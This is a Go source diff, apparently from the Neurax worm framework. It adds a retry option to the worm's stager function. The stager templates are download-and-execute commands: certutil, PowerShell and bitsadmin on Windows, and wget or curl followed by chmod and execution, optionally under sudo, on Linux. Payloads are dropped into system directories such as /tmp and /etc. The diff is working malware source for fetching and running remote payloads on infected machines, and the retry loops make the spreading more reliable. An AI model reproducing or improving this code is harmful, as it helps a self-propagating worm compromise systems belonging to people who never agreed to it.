@@ -71,6 +71,7 @@ var CommonPasswords = []string{
 type __NeuraxConfig struct {
 	Stager           string
 	StagerSudo       bool
+	StagerRetry      int
 	Port             int
 	CommPort         int
 	CommProto        string
@@ -105,6 +106,7 @@ type __NeuraxConfig struct {
 var NeuraxConfig = __NeuraxConfig{
 	Stager:           "random",
 	StagerSudo:       false,
+	StagerRetry:      0,
 	Port:             6741, //coldfire.RandomInt(2222, 9999),
 	CommPort:         7777,
 	CommProto:        "udp",
@@ -153,14 +155,15 @@ func NeuraxStager() string {
 	paths := []string{}
 	b64_decoder := ""
 	sudo := ""
+	stager_retry := strconv.Itoa(NeuraxConfig.StagerRetry + 1)
 	windows_stagers := [][]string{
-		[]string{"certutil", `certutil.exe -urlcache -split -f URL && B64 SAVE_PATH\FILENAME`},
-		[]string{"powershell", `Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
-		[]string{"bitsadmin", `bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
+		[]string{"certutil", `for /l %%N in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 SAVE_PATH\FILENAME`},
+		[]string{"powershell", `for /l %%N in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
+		[]string{"bitsadmin", `for /l %%N in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
 	}
 	linux_stagers := [][]string{
-		[]string{"wget", `SUDO wget -O SAVE_PATH/FILENAME URL; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME`},
-		[]string{"curl", `SUDO curl URL/FILENAME > SAVE_PATH/FILENAME; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME`},
+		[]string{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
+		[]string{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
 	}
 	linux_save_paths := []string{"/tmp/", "/lib/", "/home/",
 		"/etc/", "/usr/", "/usr/share/"}
@@ -217,6 +220,7 @@ func NeuraxStager() string {
 	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", NeuraxConfig.Path, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "SUDO", sudo, -1)
+	selected_stager_command = strings.Replace(selected_stager_command, "RETRY", stager_retry, -1)
 	return selected_stager_command
 }
 
